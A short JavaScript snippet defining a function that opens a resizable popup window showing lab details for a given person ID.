/**
 * function to open a popup window for a Lab details
 */
function showLabDetails(id) {
	  var w = window.open('lab_detail.html?personId='+ id,'labdetailPopup','resizable=1,toolbar=0,scrollbars=1,width=500,height=350');
	  w.focus();
	}
